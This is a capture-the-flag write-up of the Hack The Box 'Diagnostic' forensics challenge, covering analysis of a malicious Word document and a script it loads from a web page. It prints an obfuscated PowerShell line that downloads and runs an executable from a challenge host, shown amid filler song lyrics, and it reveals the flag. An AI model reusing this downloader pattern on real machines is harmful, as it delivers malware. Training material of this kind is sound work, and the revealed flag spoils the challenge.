---
date: "2024-01-24T00:00:00Z"
title: Diagnostic HTB CTF Write-up
tags : ["Forensics"]

---
## Introduction
<p>&nbsp;</p>

In this comprehensive write-up, we will delve into the intricate world of digital forensics, exploring the clever tricks and challenges involved in uncovering cybercrimes. Our focus will be on safely extracting and analyzing data, navigating through various obstacles, and mastering the art of forensic investigation. This guide aims to provide insights into overcoming challenges on platforms like Hack The Box and gaining proficiency in forensic-based scenarios.

<p>&nbsp;</p>

## Diagnostic


The Diagnostic challenge, categorized under Forensics on Hack The Box, serves as a practical test of forensic knowledge and skills.


**Step 1: Retrieving and Analyzing the File**

- Download the file (diagnostic.doc) by accessing the provided IP in the browser.
- Utilize tools like **oleid** and **oleobj** to analyze the file.  **oleobj** is a Python script and module to parse OLE objects and files stored into various MS Office file formats (doc, xls, ppt, docx, xlsx, pptx, etc)


![image](/img/Diagnostic/diagnostic3.png)


**Step 2: Inspecting Web Browser Content**

- Upon pasting the link in the web browser, an initially empty page reveals a script content.
- Inspect the page and discover intriguing script content.


![image](/img/Diagnostic/diagnostic4.png)


   it's so interesting'
- Copy the script content to a text editor for further analysis (e.g., SCITE).


![Image](/img/Diagnostic/diagnostic%205.png)


**step 3:  Decoding and Converting Characters**

- Convert characters to ASCII using the **ASCII table** from ascii.com.
- Use an online tool (e.g., CyberChef) to convert parts of the content to **base64 strings**.

![image](/img/Diagnostic/diagnostic7.png)


![Image](/img/Diagnostic/diagnostic6.png)


**Decoded content**

```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!
Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!Hark the sound of Tar Heel voices
Ringing clear and True
Singing Carolina's praises
Shouting N.C.U.

Hail to the brightest Star of all
Clear its radiance shine
Carolina priceless gem,
Receive all praises thine.

Neath the oaks thy sons and daughters
Homage pay to thee
Time worn walls give back their echo
Hail to U.N.C.

Though the storms of life assail us
Still our hearts beat true
Naught can break the friendships formed at
Dear old N.C.U.
Hark the sound of Tar Heel voices
Ringing clear and True
Singing Carolina's praises
Shouting N.C.U.

Hail to the brightest Star of all
Clear its radiance shine
Carolina priceless gem,
Receive all praises thine.

Neath the oaks thy sons and daughters
Homage pay to thee
Time worn walls give back their echo
Hail to U.N.C.

Though the storms of life assail us
Still our hearts beat true
Naught can break the friendships formed at
Dear old N.C.U.
```


**Step 4: Uncovering the Decoded Message**

After converting we notice that the first part is quite interesting, 


**Decoded Message**

```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
```
    
- Decoded message reveals a PowerShell script with interesting concatenation.

```
  ${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
```

 - Concatenate the PowerShell script correctly to unveil the flag.

 
![Image](/img/Diagnostic/pwshflag.png)


**Flag**

```
HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}
```

## Tools used

- cyberchef
- oleid
- powershell


## Conclusion

This write-up provides a step-by-step guide to solving the Diagnostic HTB CTF Forensic Challenge. By exploring the intricacies of digital forensics, users can enhance their skills in analyzing and decoding complex scenarios, ultimately contributing to their proficiency in cybersecurity challenges.
